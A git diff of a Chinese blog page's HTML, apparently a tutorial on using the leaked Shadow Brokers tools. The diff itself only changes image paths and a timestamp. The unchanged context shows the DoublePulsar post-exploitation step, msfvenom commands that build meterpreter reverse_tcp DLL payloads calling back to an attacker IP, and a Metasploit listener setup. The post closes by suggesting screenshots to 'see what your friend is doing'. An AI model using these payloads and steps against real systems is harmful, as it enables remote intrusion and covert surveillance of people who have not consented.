@@ -113,9 +113,9 @@
 <meta property="og:image" content="http://i2.muimg.com/567571/2d3459d4d4d9a663.png">
 <meta property="og:image" content="http://i4.buimg.com/567571/c5a02fa29f6473de.png">
 <meta property="og:image" content="http://i4.buimg.com/567571/7fdae783c7f5ef19.png">
-<meta property="og:image" content="http://yoursite.com/Shadowbroker工具使用方法/meterpreter.jpg">
-<meta property="og:image" content="http://yoursite.com/Shadowbroker工具使用方法/截屏.jpg">
-<meta property="og:updated_time" content="2017-04-28T06:49:59.856Z">
+<meta property="og:image" content="http://yoursite.com/2017/04/26/Shadowbroker工具使用方法/meterpreter.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/04/26/Shadowbroker工具使用方法/截屏.jpg">
+<meta property="og:updated_time" content="2017-06-22T14:37:35.746Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Shadowbroker工具使用方法">
 <meta name="twitter:description" content="运行环境准备 安装Python2.6和pywin32，注意Python2.6必须为32位版本； 在windows利用工具目录下创建listeningposts目录； 使用Python2.6运行fb.py；">
@@ -449,7 +449,7 @@
 <h1 id="后渗透攻击"><a href="#后渗透攻击" class="headerlink" title="后渗透攻击"></a>后渗透攻击</h1><p>攻击成功之后就可以开始使用DoublePulsar插件，DoublePulsar类似于一个注入器，有以下几个功能，使用该插件ping功能探测目标系统版本：<br><img src="http://i2.muimg.com/567571/bc51de9b630c3cc2.png" alt=""><br><img src="http://i2.muimg.com/567571/2d3459d4d4d9a663.png" alt=""><br>准备注入dll payload：<br><img src="http://i4.buimg.com/567571/c5a02fa29f6473de.png" alt=""><br>使用kali生成dll木马：<br>X64：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.114 LPORT=8089 -f dll &gt; /root/Desktop/1.dll</div></pre></td></tr></table></figure></p>
 <p>X86：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.114 LPORT=8089 -f dll &gt; /root/Desktop/1.dll</div></pre></td></tr></table></figure></p>
 <p><img src="http://i4.buimg.com/567571/7fdae783c7f5ef19.png" alt=""><br>Kali端开启监听：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ msfconsole</div><div class="line"> msf &gt; use exploit/multi/handler</div><div class="line"> msf &gt; <span class="built_in">set</span> LHOST 192.168.1.114</div><div class="line"> msf &gt; <span class="built_in">set</span> LPORT 8089</div><div class="line"> msf &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</div><div class="line">（msf &gt; <span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp）</div><div class="line"> msf &gt; exploit</div></pre></td></tr></table></figure></p>
-<p>将dll拷贝到攻击机，使用fb.py加载，执行成功之后，kali中会得到一个meterpreter。<br><img src="/Shadowbroker工具使用方法/meterpreter.jpg" alt=""><br>截屏，看看朋友在做什么：<br><img src="/Shadowbroker工具使用方法/截屏.jpg" alt=""></p>
+<p>将dll拷贝到攻击机，使用fb.py加载，执行成功之后，kali中会得到一个meterpreter。<br><img src="/2017/04/26/Shadowbroker工具使用方法/meterpreter.jpg" alt=""><br>截屏，看看朋友在做什么：<br><img src="/2017/04/26/Shadowbroker工具使用方法/截屏.jpg" alt=""></p>
 
       
     </div>
